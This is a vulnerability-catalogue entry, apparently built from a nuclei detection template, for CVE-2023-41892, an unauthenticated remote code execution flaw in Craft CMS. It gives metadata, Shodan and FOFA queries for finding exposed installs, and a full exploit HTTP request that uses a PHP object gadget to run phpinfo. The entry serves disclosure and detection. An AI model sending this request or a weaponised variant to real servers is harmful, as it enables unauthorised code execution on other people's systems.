---
layout: post
cve_id: CVE-2023-41892
title: CraftCMS < 4.4.15 - Unauthenticated Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-41892.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-41892.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
reference:
- https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
- https://blog.calif.io/p/craftcms-rce
- https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical
- https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857
- https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-41892
  cwe-id: CWE-94
  epss-score: 0.93942
  epss-percentile: 0.99874
  cpe: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: craftcms
  product: craft_cms
  shodan-query:
  - http.favicon.hash:-47932290
  - cpe:"cpe:2.3:a:craftcms:craft_cms"
  - http.html:craftcms
  fofa-query:
  - icon_hash=-47932290
  - body=craftcms
  publicwww-query: craftcms
tags:
- cve2023
- cve
- rce
- unauth
- craftcms
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector leading to Remote Code Execution (RCE). Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

## ðŸŒ HTTP Request
```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.2 Safari/537.36
Connection: close
Content-Length: 238
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```

